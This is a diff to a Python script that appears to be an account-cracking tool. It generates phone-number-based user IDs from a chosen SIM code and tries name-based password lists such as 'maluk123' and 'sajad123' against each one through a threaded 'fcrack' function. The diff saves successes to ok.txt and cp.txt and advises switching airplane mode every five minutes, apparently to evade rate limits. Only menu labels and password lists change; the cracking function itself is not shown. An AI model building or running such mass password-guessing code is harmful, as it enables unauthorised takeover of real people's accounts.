@@ -1157,8 +1157,8 @@ def menu():
 	os.system('clear')
 	print(logo)
 	print('[1] LAST 7 DIGIT')
-	print('[2] Sajjid + Maluk PASS')
-	print('[3] Saleem + BALOCH PASS')
+	print('[2] SAJJID + MALUK PASS')
+	print('[3] SALEEM + BALOCH PASS')
 	print('[4] BEST FOR PUBG IDS')
 	print('[5] BEST FOR FREE FIRE IDS')
 	print('[0] EXIT TO MAIN MENU')
@@ -1239,12 +1239,12 @@ def ali_khan():
 		tl = str(len(user))
 		print('[•] TOTAL ACCOUNTS    : \033[1;32m'+tl)
 		print('\033[1;37m[•] SELECTED CODE     : \033[1;32m'+kode)
-		print('\033[1;37m[•] METHOD YOU CHOOSE : \033[1;32Saleem + KHAN')
+		print('\033[1;37m[•] METHOD YOU CHOOSE : \033[1;32SAJJID + MALUK')
 		print('\x1b[1;97m[•] USE FLIGHT [\033[1;32mAIRPLANE\033[1;37m] MODE IN EVERY 5 MINUTES')
 		lines()
 		for guru in user:
 			uid = kode+guru
-			pwx = [guru,'khankhan','khan1122','khan12','khan123','khan786']
+			pwx = [guru,'maluk123','maluk122','maluk312','malukmaluk','malukkhan']
 			yaari.submit(fcrack,uid,pwx,tl)
 	print('[✓] Crack process has been completed')
 	print('[?] Ids saved in ok.txt,cp.txt')
@@ -1263,7 +1263,7 @@ def malik_baloch():
 	user=[]
 	os.system('clear')
 	print(logo)
-	print('[√] EXAMPLE :92318,92345,92323,92306.ETC')
+	print('[√] EXAMPLE :0318,0345,0323,0306.ETC')
 	lines()
 	kode = input('[+]\033[1;37m PUT YOUR SIM CODE : ')
 	os.system('clear')
@@ -1280,12 +1280,12 @@ def malik_baloch():
 		tl = str(len(user))
 		print('[•] TOTAL ACCOUNTS    : \033[1;32m'+tl)
 		print('\033[1;37m[•] SELECTED CODE     : \033[1;32m'+kode)
-		print('\033[1;37m[•] METHOD YOU CHOOSE : \033[1;32mSajjid + maluk')
+		print('\033[1;37m[•] METHOD YOU CHOOSE : \033[1;32mSAJAD + MALUK')
 		print('\x1b[1;97m[•] USE FLIGHT [\033[1;32mAIRPLANE\033[1;37m] MODE IN EVERY 5 MINUTES')
 		lines()
 		for guru in user:
 			uid = kode+guru
-			pwx = [guru,'maluk123','maluk321','baloch123']
+			pwx = [guru,'sajad123','sjaad321','Sajad123']
 			yaari.submit(fcrack,uid,pwx,tl)
 	print('[✓] Crack process has been completed')
 	print('[?] Ids saved in ok.txt,cp.txt')
